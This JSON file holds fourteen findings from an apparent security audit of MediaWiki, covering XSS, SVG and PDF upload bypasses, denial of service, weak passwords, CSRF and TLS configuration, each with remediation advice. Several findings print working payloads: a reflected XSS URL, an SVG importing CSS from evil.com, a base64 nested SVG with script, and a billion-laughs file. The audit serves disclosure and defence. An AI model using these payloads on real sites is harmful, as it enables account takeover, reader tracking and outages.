{
  "tstorg-wmf1214-8": "1. reflected xss in api.php class: data validation severity: high difficulty: low finding id: tstorg-wmf1214-8 targets: the api endpoint, available at http://devwiki/w/api.php. description: the api supports multiple data output formats, some of which have recently been deprecated. the wddx output format will return a response with content-type: text/xml . the response always indicates that the wddx output format has been deprecated and instructs the api user to use the json format instead. however, if an api request with this output format is sent to api.php with an invalid parameter, the response will also include an error message that reflects the user-supplied parameter without any output encoding. this allows an attacker to inject xml, which can be used to trick the browser into interpreting the response as xhtml and executing injected javascript. to exploit this vulnerability, an attacker can craft a simple url that, when clicked by a mediawiki user, will execute arbitrary javascript in their browser session for that domain. the following url will execute javascript that pops up an alert window on the resulting mediawiki page, demonstrating a reflected xss attack. http://devwiki/w/api.php?action=flow&format=wddx&submodule=invalid%3c/string%3e%3cfoo%3e%0a%3ch tml%20xmlns%3ahtml%3d%27http%3a%2f%2fwww.w3.org%2f1999%2fxhtml%27%3e%0a%20%3chtml%3ascript%3ea lert(%22reflected%20xss!%22)%3b%3c%2fhtml%3ascript%3e%0a%3c%2fhtml%3e%0a%3c%2ffoo%3e%3cstring%3 e&page=user_talk%3aadmin&ntreplyto=&nttopic=flow&ntcontent=flowwwww&token=3b44a9711080c52414b4 d1f05682590554a1ead0%2b this exploit works on several browsers that test organization tested and bypasses chrome's anti-xss filters, making it especially effective. exploit scenario: an attacker crafts a malicious link with javascript that attempts to assign administrative rights to their own user account. they insert the link on a mediawiki page and wait for an active administrator with the appropriate privileges to click it. when the administrator clicks the link, the javascript is reflected in the response, which results in the administrator's browser silently sending a request to grant administrator privilege to the attacker's mediawiki account. the attacker then uses this unauthorized privileged access to inspect user ip addresses or destroy content. short term solution: in this case, because the wddx format is deprecated, no user-supplied data needs to be reflected in the response at all. if there is a specific need to display this error data, including the user-supplied parameters, apply the same output encoding that is used when the xml output format is requested. review the code for similar issues where output-encoding has not been applied to a response. long term solution: implement security regression tests that ensure that appropriate output encoding occurs for all user-supplied data. implement a content security policy (csp). csp is an http header that can control what types of active content (such as javascript, applets, and css) the browser will allow, based on how the content is presented. an optimally configured csp policy will never allow browsers to execute inline javascript, eval statements, or scripts in dom event attributes. this requires that all javascript is loaded explicitly from external sources with whitelisted urls. however, if inline scripts and event attributes are required in the meantime, the csp header can by used to transmit a nonce value with each source in the whitelist. this nonce must then be included as a script attribute and checked by the server. this helps prevent xss attacks. the csp specification can be found at https://w3c.github.io/webappsec/specs/content-security-policy/#usage-4.",
  "tstorg-wmf1214-3": "2. external reference in svg class: data validation severity: high difficulty: low finding id: tstorg-wmf1214-3 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: when uploading an svg file, it is possible to bypass the validation filters and upload an svg file that references a remote css file. the validation routines that prevent inclusion of remote css files perform checks in a case-sensitive manner and fails to block import and other case-variations. for example, the following style declaration within an svg file will cause any browser that renders the file to fetch http://evil.com/attack.css: <svg xmlns= \"http: // www .w3.org /2000/ svg \"> <style> @import 'http: // evil .com /attack .css ';</style> </svg> listing 1: specially-crafted svg file including a remote style sheet. this vulnerability can be exploited to de-anonymize mediawiki's readers. this can be used by malicious individuals or governments who will be able to identify the reader's location from their ip address, as well as the visited page from the referrer header. exploit scenario: a mediawiki user uploads a hostile svg file that references a style sheet on an attacker-controlled webserver. the user then embeds this svg file into the content of an article. by monitoring users that request the style sheet, the attacker can build a complete list of users that have viewed the article in question. short term solution: modify the regular expressions for validating svg file uploads to block the import keyword in a case-insensitive manner. long term solution: examine all other validation expressions to ensure that case sensitivity is handled in a context-appropriate manner. implement a csp in order to limit passive content like images. this can be configured to prohibit callbacks to third parties on page loads, effectively preventing de-anonymization.",
  "tstorg-wmf1214-11": "3. stored xss in uploaded svg files class: data validation severity: medium difficulty: low finding id: tstorg-wmf1214-11 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: when uploading an svg file, it is possible to bypass the validation filters and upload an svg file that executes javascript when rendered. the svg validation is a blacklist-based approach and contains protections against numerous techniques for embedding javascript in svg files; however, the protections against nested svg files are inadequate due to a missing mime type blacklist. specifically, data: uris with the image/svg or text/xml formats are blacklisted, but the application/xml mime type is sufficient to create a nested svg file with javascript code. # /includes /upload /uploadbase .php # href with embedded svg as target if ($stripped == 'href ' && preg_match ( '!data :[^,]* image /svg [^,]*,! sim ', $value )){ wfdebug ( __method__ . \": found href to embedded svg \" . \"\\\"< $strippedelement '$attrib '=' $value '...\\\" in uploaded file .\\n\" ); return true ;} # href with embedded (text /xml ) svg as target if ( $stripped == 'href ' && preg_match ( '!data :[^,]* text /xml [^,]*,! sim ', $value )){ wfdebug ( __method__ . \": found href to embedded svg \" . \"\\\"< $strippedelement '$attrib '=' $value '...\\\" in uploaded file .\\n\" ); return true ;} listing 2: blacklist filtering for data: uris with specific mime types. the following example svg file contains a nested svg file embedded within a data: uri. the nested svg file contains executable javascript. <svg xmlns= \"http: // www .w3.org /2000/ svg \" xmlns:xlink= \"http: // www .w3.org /1999/ xlink \"> <use xlink:href= \"data:application /xml ;base64 , phn2zyb4bwxucz0iahr0cdovl3d3dy53my5vcmcvmjawmc9zdmciihhtbg5zonhsaw5r psjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hsaw5rij4kpgrlznm +cjxjaxjjbgugawq9inrlc3qiihi9i juwiibjed0imtawiibjet0imtawiibzdhlszt0izmlsbdogi0ywmci +cjxzzxqgyxr0cmlidxrltm ftzt0izmlsbcigyxr0cmlidxrlvhlwzt0iq1ntiibvbmjlz2lupsdhbgvydchkb2n1bwvudc5jb29r awupjwpvbmvuzd0nywxlcnqoim9uzw5kiiknihrvpsijmdbgiibizwdpbj0imxmiigr1cj0inxmiic 8+ cjwvy2lyy2xlpgo8l2rlznm +cjx1c2ugegxpbms6ahjlzj0ii3rlc3qilz4kpc9zdmc +# test \"/> </svg> listing 3: svg file with a nested svg file containing executable javascript code. during testing, this exploit was only confirmed against the firefox browser. testing indicates that other browsers do not support nested svg files. javascript in svg files is evaluated in its own sandbox origin; it should not have access to cookies or other data from the wiki domain context. exploit scenario: an attacker crafts a malicious svg document that contains canned javascript exploit code and uploads it to a popular section on the mediawiki application. when the svg file is viewed, the victim's browser is fingerprinted and instructed to download appropriate exploit code from an attacker-controlled server. the attacker is able to compromise users who view the hostile svg file, and the attacker can expand their impact by hijacking the privileges of the victim users. short term solution: modify the svg validation blacklist filters to include the application/xml mime type. verify that no other mime types can be used to embed nested svg files. long term solution: transition the svg validation logic to a whitelist-based approach.",
  "tstorg-wmf1214-13": "4. entity expansion in svg and xmp metadata class: denial of service severity: medium difficulty: low finding id: tstorg-wmf1214-13 targets: the xml parser of the upload feature, available at http://devwiki/wiki/special:upload. description: when uploading an svg file, or any file that includes xmp metadata, it is possible to include xml doctype declarations that trigger an xml entity expansion attack against the xml parser when the uploaded file is processed. this attack uses a series of expanding xml entities that, when fully expanded, can consume a large amount of memory . this causes the xml parser to consume all available resources on the system, leaving the webserver unresponsive. the billion laughs 6 attack is an example of such attack, which results in approximately 3gb of data to be processed. an example of a file that exploits this vulnerability is below: <? xml version =\"1.0 \" encoding= \"utf -8\" standalone =\"yes \"?> <! doctype svg [ <!entity lol \"lol \"> <! element lolz (# pcdata )> <! entity lol1 \"&lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;\"> <! entity lol2 \"&lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;\"> <! entity lol3 \"&lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;\"> <! entity lol4 \"&lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;\"> <! entity lol5 \"&lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;\"> <! entity lol6 \"&lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;\"> <! entity lol7 \"&lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;\"> <! entity lol8 \"&lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;\"> <! entity lol9 \"&lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;\"> ]> <svg> <lolz>& lol9 ;</lolz> </svg> listing 4: example of the billion laughs attack embedded in an svg file. this file will cause consumption of 3gb of memory when uploaded. exploit scenario: a mediawiki user wishes to suppress information contained on wikimedia foundation's website during a sensitive election period. to accomplish this, the attacker uploads a hostile svg file containing the billion laughs attack. the attacker is able to bring the mediawiki application offline for an extended period during a critical timeframe. short term solution: determine if xml dtd support is necessary for the correct processing of uploaded files. disable dtd parsing if it is unnecessary. long term solution: set limits on execution time and resource usage for all scripts that perform entity substitution on xml data. 6 https://en.wikipedia.org/wiki/billion_laughs",
  "tstorg-wmf1214-1": "5. lack of upper limit on password length allows dos class: denial of service severity: medium difficulty: low finding id: tstorg-wmf1214-1 targets: the login page, available at http://devwiki/w/index.php?title=special:userlogin. description: the application does not have an upper limit on the length of a user-supplied password, which allows for arbitrarily large strings to be passed to the password hashing function. because passwords are hashed by default using pbkdf2+sha256 with a cost of 10,000, extremely large passwords can be used to consume large amounts of system resources, resulting in the site becoming unresponsive to other requests. exploit scenario: an unauthenticated attacker writes a script that attempts to log into a user account with a very large password,e.g. 2-4mb in size. running this script repeatedly against wikimedia foundation endpoints could cause enough servers to consume their resources, causing the site to become unresponsive or inaccessible to legitimate users. short term solution: implement an upper limit for password strings-128 characters should be more than sufficient. enforce this limit before performing any further processing on user-supplied passwords. long term solution: before performing any compression, decompression or hashing operation, ensure that user-supplied data meets basic sanity parameters in terms of size and length.",
  "tstorg-wmf1214-15": "6. external reference in pdf class: data validation severity: medium difficulty: medium finding id: tstorg-wmf1214-15 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: pdf files can contain references to external content, such as images, audio, and video. loading external content from a pdf can be used to de-anonymize users who view the pdf directly using adobe reader or another pdf reader. exploit scenario: an attacker wishes to determine who reads a specific wiki article. the attacker creates a pdf that loads content from an attacker-controlled server, using an existing pdf document related to the article as a base. a user interested in the topic opens the pdf for more information while reading the article and their pdf reader sends a request to the attacker's server, revealing their ip address, and by extension, their location. short term solution: provide a click-through warning informing users that pdf documents are active content that could potentially de-anonymize them when viewed directly . long term solution: convert uploaded pdfs to static images to avoid issues with active content. ensure the library used for conversion is robust as it will be parsing potentially malicious content on the server side, which could be a greater compromise than individual users. consider setting up a sandboxed environment.",
  "tstorg-wmf1214-14": "7. stored xss in pdf files class: data validation severity: medium difficulty: medium finding id: tstorg-wmf1214-14 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: the pdf format allows for documents containing embedded javascript. during testing, a pdf that executes javascript when the document is opened was successfully uploaded. testing indicated that this feature only works in adobe reader, whereas other readers such as the pdf reader built into firefox and the pdf reader built into chrome do not support javascript actions. javascript could be used to de-anonymize a user or to attempt exploits against a user. pdf readers execute embedded javascript in a sandboxed context that should not have any ability to access data from the wiki domain. exploit scenario: an attacker wishes to determine who reads a specific wiki article. the attacker creates a pdf that uses javascript to make surreptitious http requests to an attacker-controlled server, using an existing pdf document related to the article as a base. a user interested in the topic opens the pdf for more information while reading the article and their pdf reader sends a request to the attacker, revealing their ip address, and by extension, their location. short term solution: provide a click-through warning informing users that pdf documents are active content that could potentially de-anonymize them when viewed directly . long term solution: convert uploaded pdfs to static images to avoid issues with active content. ensure the library used for conversion is robust as it will be parsing potentially malicious content on the server side, which could be a greater compromise than individual users. consider setting up a sandboxed environment.",
  "tstorg-wmf1214-10": "8. custom javascript may yield privilege escalation class: data validation severity: medium difficulty: medium finding id: tstorg-wmf1214-10 targets:user's custom scripts, such as http://devwiki/w/index.php?title=user:foo/common.js&action= submit. description: when editing any user's custom javascript, the script is executed whenever the ``show preview'' or ``show changes'' buttons are clicked. this could allow an attacker to trick another user into executing javascript which hijacks their session. because privileged users can edit the javascript of lower privileged users, this could lead to privilege escalation. exploit scenario: a low-privileged user adds some complex custom javascript to their account, with malicious code embedded within that directs people to a fake login screen or performs actions on the victim's behalf. the user complains to an administrator that they are having difficulty with their custom ``skin'' , and asks the administrator to change a small portion of the script for them. upon previewing the edit or viewing changes, the malicious code executes in the context of the administrator's session. short term solution: do not include another user's custom script when previewing or showing changes. these pages should only allow users to edit and view code. long term solution:the custom javascript system has two security flaws (see finding 10 on page 27). consider deprecating this functionality and allowing users to customize the site using client-side code instead.",
  "tstorg-wmf1214-2": "9. weak password policy class: configuration severity: medium difficulty: high finding id: tstorg-wmf1214-2 targets: the signup page, available at http://devwiki/w/index.php?title=special:userlogin&type= signup. description: wikimedia foundation does not enforce a strong password policy for the mediawiki application. upon account creation, a user can enter any password as long as the password is at least 1 character long and different than the user's username. the lack of password complexity requirements often results in a number of users choosing weak passwords, which increases the odds of an attacker to successfully guess user's passwords by performing a brute force or dictionary attack. exploit scenario: an attacker makes a small list of very common passwords that likely to be used on mediawiki, such as ``password'' or ``wiki'' . the attacker enumerates all usernames and tries to login with the weak passwords. because of the large amount of users on mediawiki, and the weak password policy, the success rate of the attack is high, giving the attacker mass account takeover. short term solution:implement and enforce a policy to require complex passwords. the following is an example of a complex password policy . passwords should: * be a minimum of eight characters long * contain at least one of each of the following: - an uppercase letter - a lowercase letter - a number - a special character * be different than a user's username * implement a blacklist of passwords that the user cannot use. (e.g., 123456, password, password123, qwerty1!, etc.) long term solution: in addition to enforcing the use of strong passwords, wikimedia foundation should require all admins to authenticate using multi-factor authentication, with the option for non-privileged users to opt-in.",
  "tstorg-wmf1214-5": "10. lack of registry lock on domain names class: configuration severity: medium difficulty: high finding id: tstorg-wmf1214-5 targets: the dns configuration of wikimedia.org, wikipedia.org and mediawiki.org. description: there is no dns registry lock on the various domains of the wikimedia foundation. test organization performed dns whois queries on the target domains and observed that while flags are in place to prevent client transfers, no registry locks are set up to prohibit server transfers. this could allow for a malicious or compromised registrar 7 to transfer the domain to malicious hosts. the following listing displays the whois records for wikipedia.org. it has been stripped out of the contact information. visit http://www.whois.com/whois/wikipedia.org to query up-to-date records. domain status : clientdeleteprohibited domain status : clienttransferprohibited domain status : clientupdateprohibited name server :ns0 .wikimedia .org name server :ns1 .wikimedia .org name server :ns2 .wikimedia .org dnssec :unsigned listing 5: whois records for wikipedia.org. exploit scenario: an attacker finds a vulnerability on wmf's registrar and is able to comprise it. the attacker modifies the dns records of all wmf domains and subdomains and redirects all traffic to their own servers. because emails are relying on the dns records, internal wmf communications are also sabotaged, which slows down investigation of the issue. short term solution: add a registry lock on all wmf domains by adding the following dns flags: domain status : serverdeleteprohibited domain status : servertransferprohibited domain status : serverupdateprohibited listing 6: missing flags. long term solution: consider setting up a backup communication channel that does not depend on wmf domains to avoid interruption in the event of a failure or compromise of the dns infrastructure of wmf. 7 http://blog.cloudflare.com/details-behind-todays-internet-hacks/ ",
  "tstorg-wmf1214-7": "11. users can inspect each other's personal javascript class: data exposure severity: low difficulty: low finding id: tstorg-wmf1214-7 targets: the following pages: * http://devwiki/w/index.php?title=user:admin/common.js * http://devwiki/w/load.php?debug=false&lang=en&modules=user&only=scripts&skin=vector&user= admin * http://devwiki/wiki/user:admin/(skinname).js description: mediawiki allows users to upload custom javascript and css to alter the interface and functionality of the system. this code is stored as a wiki page, and is visible to any user of the system. exploit scenario: a user uploads javascript containing personal information that may de-anonymize that user. while the contents of this script are not part of the main indexed website, another user changes the username in one of the above urls to view the victim's custom code, learning information that may be used to identify the owner of the custom code. short term solution: treat custom script the same as other user preferences by disallowing users from examining these customizations unless they are associated with the logged in account. long term solution:the custom javascript system has two security flaws (seefinding 8 on page 24). consider deprecating this functionality and allowing users to customize the site using client-side code instead.",
  "tstorg-wmf1214-6": "12. check user page lacks cross site request forgery (csrf) protection class: data validation severity: low difficulty: medium finding id: tstorg-wmf1214-6 targets: the check user page located at http://devwiki/wiki/special:checkuser. description: the process to check a corresponding username to ip address and vice versa lacks csrf protection. csrf attacks are perpetrated by issuing a request to a protected resource within a web application on behalf of a user without their knowledge. when the server receives the requests, it has no way of distinguishing the forged request from a request sent purposefully by the user. any user with basic rights on mediawiki can trick a user with check user rights into submitting multiple look up requests. this will fill the check user log with untrustworthy data. exploit scenario: an attacker with basic user rights on mediawiki makes targeted attacks towards mediawiki users with check user rights. a user with check user rights is tricked into visiting a site the attacker controls, in turn tricking their browser into sending the request that submits unnecessary check user requests. although the attacker cannot view the responses, a large number of unnecessary requests can damage the reputation of the valid user. short term solution:require a valid wpedittoken to be submitted with each check user request. long term solution: ensure that this wpedittoken is included with all state-changing requests site-wide. additionally, update the api such that if this token is not present, the user cannot make any state changing requests.",
  "tstorg-wmf1214-12": "13. user access roles are public class: data exposure severity: informational difficulty: low finding id: tstorg-wmf1214-12 targets: the following pages: * http://devwiki/codwiki/index.php/special:activeusers * http://devwiki/codwiki/index.php/special:globalusers * http://devwiki/codwiki/index.php/special:centralauth description: the target links allow unauthenticated users to look up privileges associated with roles, and the role associated with any existing user. the roles, such as ``administrator'' or ``steward'' , disclose the list of operations a specific user has permission to perform. an attacker can use this information to enumerate users with higher privileges and create targeted attacks against them. short term solution:do not show the user roles in the list of users to unauthenticated users while displaying the list of users. restrict the global account information to the privileged users only . long term solution: make a chart of what parts of user accounts are considered private or protected, and go through each way of accessing user data and make sure it conforms to specifications. perform regression checks to verify that there is no information disclosure which can be useful to the attacker.",
  "tstorg-wmf1214-4": "14. rc4 cipher enabled class: configuration severity: informational difficulty: high finding id: tstorg-wmf1214-4 targets: the tls configuration of wmf servers, such as https://www.mediawiki.org. description: the rc4-sha cipher is enabled in the ssl/tls configuration of wmf's servers. rc4 is a stream cipher that is often preferred by tls servers due to its speed; however, security researchers recently demonstrated that this cipher is not suitable to guarantee message confidentiality . the rc4 cipher is flawed in its generation of a pseudo-random stream of bytes so that a wide variety of small biases are introduced into the stream, decreasing its randomness thus creating potential for plain text recovery attacks. an advisory from the ietf, 8 released october 2013, has noted that recent improvements in the attack vectors on rc4 mean that they are on the verge of becoming practically exploitable. as such, the ietf advises that rc4 can no longer be seen as providing sufficient levels of security for tls sessions. the advisory goes on to require that tls clients and servers never negotiate the use of rc4 cipher suites. because of the deficiencies noted, the ietf advisory, referenced below, states that: * tls clients must not include rc4 cipher suites in the clienthello message. * tls servers must not select an rc4 cipher suite when a tls client sends such a cipher suite in the clienthello message. note: in march 2013, there were new attack scenarios proposed that use statistical biases in the rc4 key table to recover plaintext with a large number of tls encryptions. 9 the output from the sslyze scan test organization used to determine the targets' tls configuration can be found in appendix a.1 on the next page . short term solution:remove rc4 from production environments. update the ssl/tls configuration to only allow cryptographically strong cipher suites. refer to https://wiki.mozilla.org/security/ server_side_tls for the latest recommended cipher suite configurations. this list should prefer cipher suites that provide perfect forward secrecy, such as those using elliptic curve diffie-hellman (ecdhe). long term solution: stay abreast of security community news, such that new ssl/tls attacks or configuration weaknesses can be immediately patched or remedied. regularly check web server ssl/tls configuration using tools like sslyze10 or ssllabs.11 keep cipher suite configurations current with the latest recommended configurations found on the mozilla wiki. 12 8 http://tools.ietf.org/html/draft-popov-tls-prohibiting-rc4-01 9 http://home.hiroshima-u.ac.jp/ohigashi/rc4/ 10 https://github.com/nabla-c0d3/sslyze/releases 11 https://www.ssllabs.com/ssltest/ 12 https://wiki.mozilla.org/security/server_side_tls#recommended_configurations"
}